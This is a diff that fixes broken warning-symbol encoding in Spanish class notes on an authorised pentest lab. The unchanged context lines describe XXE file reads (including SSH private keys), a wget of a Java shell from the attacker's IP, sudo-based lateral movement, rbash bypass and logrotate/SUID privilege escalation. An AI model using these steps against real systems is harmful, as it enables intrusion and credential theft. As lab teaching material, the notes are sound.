@@ -32,7 +32,7 @@ Explicado en clase de forma sencilla: **GET** pide información al servidor y la
 
 | |
 |---|
-|âš  **Regla práctica**<br><br>Cuando vayas a enviar datos para que el servidor los procese, cambia el método a POST. Muchas veces funciona sin cambiarlo, pero otras peta. En Burp: clic derecho →’ *Change request method*, o edítalo a mano. En curl, `-X POST` (aunque con `-d` ya se sobreentiende).|
+|⚠ **Regla práctica**<br><br>Cuando vayas a enviar datos para que el servidor los procese, cambia el método a POST. Muchas veces funciona sin cambiarlo, pero otras peta. En Burp: clic derecho →’ *Change request method*, o edítalo a mano. En curl, `-X POST` (aunque con `-d` ya se sobreentiende).|
 
 ## **XXE — XML External Entity**
 
@@ -48,7 +48,7 @@ Capacidad de **leer archivos locales** del servidor a los que en principio no de
 
 | |
 |---|
-|âš  **AVISO**<br><br>No sabes si un archivo "no responde" porque no existe o porque no tienes permiso para leerlo: no ves el output que lo distinga. Es una de las problemáticas típicas del hacking: el contexto que no controlas.|
+|⚠ **AVISO**<br><br>No sabes si un archivo "no responde" porque no existe o porque no tienes permiso para leerlo: no ves el output que lo distinga. Es una de las problemáticas típicas del hacking: el contexto que no controlas.|
 
 ## **rbash — shell restringida (enjaulada)**
 
@@ -97,7 +97,7 @@ Metodología incremental: no lanzamos el payload final de golpe, vamos **forzand
 
 | |
 |---|
-|âš  **Explotación en laboratorio autorizado**<br><br>Estructura del payload XXE usado (declaración DOCTYPE + entidad externa SYSTEM que apunta a `file:///etc/passwd`, invocada dentro del campo `lastName` del bloque `userInfo`). La entidad SYSTEM es la que permite ir a buscar el valor dentro del servidor. No se reproduce el payload literal: recréalo desde GTFOBins/HackTricks o con ayuda de la documentación de XXE.|
+|⚠ **Explotación en laboratorio autorizado**<br><br>Estructura del payload XXE usado (declaración DOCTYPE + entidad externa SYSTEM que apunta a `file:///etc/passwd`, invocada dentro del campo `lastName` del bloque `userInfo`). La entidad SYSTEM es la que permite ir a buscar el valor dentro del servidor. No se reproduce el payload literal: recréalo desde GTFOBins/HackTricks o con ayuda de la documentación de XXE.|
 
 **Paso 6 — Lectura de `/etc/passwd`.** Se obtiene la lista de usuarios. De ellos, 5 pueden loguearse (`/bin/bash`); uno tiene una shell distinta del resto (rbash, restringida) y otro es root.
 
@@ -141,7 +141,7 @@ El corazón didáctico de la sesión: `sudo -l` no es "llegar y ejecutar GTFOBin
 
 | |
 |---|
-|âš  **Fallos que costaron tiempo en clase**<br><br>Errores reales de la sesión: (1) no ejecutes en un directorio sin permisos de escritura para n (p. ej. el escritorio de mike) — trabaja siempre en `/tmp`. (2) El nombre del fichero debe coincidir con el de la clase pública (`Shell.java` con clase `Shell`), o `javac` falla. (3) Se ejecuta el `.class`, no el `.java`.|
+|⚠ **Fallos que costaron tiempo en clase**<br><br>Errores reales de la sesión: (1) no ejecutes en un directorio sin permisos de escritura para n (p. ej. el escritorio de mike) — trabaja siempre en `/tmp`. (2) El nombre del fichero debe coincidir con el de la clase pública (`Shell.java` con clase `Shell`), o `javac` falla. (3) Se ejecuta el `.class`, no el `.java`.|
 
 Transferencia del archivo: levantar un servidor con `python3 -m http.server <puerto>` en tu Kali y descargarlo en la víctima con `wget http://<TU_IP>/Shell.java`. El log código 200 en tu servidor confirma la descarga. **Ojo con usar tu IP correcta**, no `127.0.0.1`.
 
@@ -171,7 +171,7 @@ Técnica (logrotate): se prepara un directorio de trabajo en `/tmp` con permisos
 
 | |
 |---|
-|âš  **Explotación en laboratorio autorizado**<br><br>En esta máquina una reverse shell no funciona bien en la escalada final porque el proceso de logrotate no es estable: mejor spawnear una bash o dar SUID a `/bin/bash`. dd sigue una dinámica similar (escritura de ficheros como root/usuario privilegiado). No memorices el payload: entiende que necesitas un `.conf` malicioso y unos parámetros correctos.|
+|⚠ **Explotación en laboratorio autorizado**<br><br>En esta máquina una reverse shell no funciona bien en la escalada final porque el proceso de logrotate no es estable: mejor spawnear una bash o dar SUID a `/bin/bash`. dd sigue una dinámica similar (escritura de ficheros como root/usuario privilegiado). No memorices el payload: entiende que necesitas un `.conf` malicioso y unos parámetros correctos.|
 
 | |
 |---|
@@ -217,7 +217,7 @@ curl -X POST -d '<BLOQUE_XML_XXE>' http://IP/upload.php
 
 | |
 |---|
-|âš  **AVISO**<br><br>El `<BLOQUE_XML_XXE>` es el DOCTYPE con la entidad externa SYSTEM apuntando a `file:///etc/passwd` (o a `/var/www/html/datos.php`, o a `/home/<user>/.ssh/id_rsa`) e invocada en `lastName`. No se reproduce literal: recréalo desde HackTricks/GTFOBins.|
+|⚠ **AVISO**<br><br>El `<BLOQUE_XML_XXE>` es el DOCTYPE con la entidad externa SYSTEM apuntando a `file:///etc/passwd` (o a `/var/www/html/datos.php`, o a `/home/<user>/.ssh/id_rsa`) e invocada en `lastName`. No se reproduce literal: recréalo desde HackTricks/GTFOBins.|
 
 ## **Fuerza bruta SSH y bypass rbash**
 
@@ -239,21 +239,21 @@ sudo -l; javac /tmp/Shell.java; sudo -u n /usr/bin/java -cp /tmp Shell; echo 'im
 
 | |
 |---|
-|âš  **Recordatorio java**<br><br>El nombre del `.java` debe coincidir con la clase pública que contiene (aquí `Shell`), o `javac` fallará. Ejecuta siempre el `.class` compilado, y hazlo en un directorio escribible por el usuario destino (`/tmp`).|
+|⚠ **Recordatorio java**<br><br>El nombre del `.java` debe coincidir con la clase pública que contiene (aquí `Shell`), o `javac` fallará. Ejecuta siempre el `.class` compilado, y hazlo en un directorio escribible por el usuario destino (`/tmp`).|
 
 # **6. Riesgos, errores comunes y buenas prácticas**
 
 | |
 |---|
-|âš  **Alcance**<br><br>Todo el contenido es para laboratorios autorizados (TheHackerLabs, HTB, entornos propios). No lo apliques sobre sistemas de terceros sin permiso explícito.|
+|⚠ **Alcance**<br><br>Todo el contenido es para laboratorios autorizados (TheHackerLabs, HTB, entornos propios). No lo apliques sobre sistemas de terceros sin permiso explícito.|
 
 | |
 |---|
-|âš  **AVISO**<br><br>**Trabaja siempre en `/tmp`** para movimientos laterales: evita el error de ejecutar payloads en directorios sin permisos para el usuario destino (le pasó al instructor y perdió media hora).|
+|⚠ **AVISO**<br><br>**Trabaja siempre en `/tmp`** para movimientos laterales: evita el error de ejecutar payloads en directorios sin permisos para el usuario destino (le pasó al instructor y perdió media hora).|
 
 | |
 |---|
-|âš  **AVISO**<br><br>**Nombre de fichero = clase** en Java; ejecuta el `.class`, no el `.java`. Comprueba tu **IP real** (`ifconfig`/`ip a`) antes de servir/descargar archivos: usar una IP antigua o `127.0.0.1` es un fallo típico.|
+|⚠ **AVISO**<br><br>**Nombre de fichero = clase** en Java; ejecuta el `.class`, no el `.java`. Comprueba tu **IP real** (`ifconfig`/`ip a`) antes de servir/descargar archivos: usar una IP antigua o `127.0.0.1` es un fallo típico.|
 
 | |
 |---|
